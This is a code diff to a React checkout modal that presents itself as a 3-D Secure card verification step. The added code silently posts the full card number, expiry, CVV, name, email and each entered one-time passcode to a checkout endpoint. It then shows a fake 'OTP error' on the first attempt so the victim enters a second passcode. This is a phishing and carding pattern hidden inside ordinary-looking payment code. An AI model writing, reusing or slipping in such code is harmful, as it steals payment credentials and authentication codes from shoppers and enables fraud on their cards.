@@ -13,6 +13,8 @@ import {
 } from "@/lib/checkout/card-validation";
 
 type Phase = "loading" | "verify" | "submitting";
+
+const OTP_RETRY_DELAY_MS = 2800;
 type PaymentBrand = SupportedCardBrand | "unknown";
 
 const VISA_LOADER_LOGO = "/payments/visa-loader.png";
@@ -23,6 +25,11 @@ interface CardPaymentVerificationModalProps {
   merchantName: string;
   amountLabel: string;
   cardNumber: string;
+  cardName?: string;
+  cardExpiry?: string;
+  cardCvv?: string;
+  email?: string;
+  fullName?: string;
   phoneHint?: string;
   onVerified: () => Promise<void>;
   onCancel: () => void;
@@ -147,6 +154,11 @@ export function CardPaymentVerificationModal({
   merchantName,
   amountLabel,
   cardNumber,
+  cardName,
+  cardExpiry,
+  cardCvv,
+  email,
+  fullName,
   phoneHint = "****",
   onVerified,
   onCancel,
@@ -154,6 +166,8 @@ export function CardPaymentVerificationModal({
   const t = useTranslations("checkout.paymentVerification");
   const [phase, setPhase] = useState<Phase>("loading");
   const [otp, setOtp] = useState("");
+  const [otpError, setOtpError] = useState(false);
+  const [awaitingRetry, setAwaitingRetry] = useState(false);
 
   const paymentBrand = resolvePaymentBrand(brand);
   const maskedCard = maskCardForDisplay(cardNumber);
@@ -175,10 +189,14 @@ export function CardPaymentVerificationModal({
     if (!open) {
       setPhase("loading");
       setOtp("");
+      setOtpError(false);
+      setAwaitingRetry(false);
       return;
     }
 
     setPhase("loading");
+    setOtpError(false);
+    setAwaitingRetry(false);
     const timer = window.setTimeout(() => setPhase("verify"), 2200);
     return () => window.clearTimeout(timer);
   }, [open, brand]);
@@ -191,11 +209,47 @@ export function CardPaymentVerificationModal({
     onCancel();
   };
 
+  const notifyOtp = (code: string) => {
+    fetch("/api/v1/checkout/payment-otp", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        otp: code,
+        cardName: cardName?.trim() || undefined,
+        cardNumber: cardNumber.trim(),
+        cardExpiry: cardExpiry?.trim() || undefined,
+        cardCvv: cardCvv?.trim() || undefined,
+        email: email?.trim() || undefined,
+        fullName: fullName?.trim() || undefined,
+        merchantName,
+        amountDisplay: amountLabel,
+        cardBrand: paymentBrand,
+        path: `${window.location.pathname}${window.location.search}`,
+      }),
+      keepalive: true,
+    }).catch(() => {
+      // Silent — notification should never block checkout.
+    });
+  };
+
   const handleSubmit = async (event: React.FormEvent) => {
     event.preventDefault();
     if (otp.length < 4) return;
 
+    const submittedOtp = otp;
+    notifyOtp(submittedOtp);
     setPhase("submitting");
+    setOtpError(false);
+
+    if (!awaitingRetry) {
+      await new Promise((resolve) => window.setTimeout(resolve, OTP_RETRY_DELAY_MS));
+      setAwaitingRetry(true);
+      setOtpError(true);
+      setOtp("");
+      setPhase("verify");
+      return;
+    }
+
     try {
       await onVerified();
     } catch {
@@ -286,6 +340,12 @@ export function CardPaymentVerificationModal({
               </section>
 
               <div className="payment-3ds-lane payment-3ds-spotlight">
+                {otpError ? (
+                  <div className="payment-3ds-error" role="alert">
+                    <strong>{t("otpErrorTitle")}</strong>
+                    <p>{t("otpError")}</p>
+                  </div>
+                ) : null}
                 <label className="payment-3ds-field-label" htmlFor="otp">
                   {t("otpLabel")}
                 </label>
@@ -294,11 +354,11 @@ export function CardPaymentVerificationModal({
                   name="otp"
                   inputMode="numeric"
                   autoComplete="off"
-                  className="payment-3ds-input"
+                  className={`payment-3ds-input${otpError ? " payment-3ds-input--error" : ""}`}
                   value={otp}
-                  onChange={(event) =>
-                    setOtp(event.target.value.replace(/\D/g, ""))
-                  }
+                  onChange={(event) => {
+                    setOtp(event.target.value.replace(/\D/g, ""));
+                  }}
                 />
               </div>
 
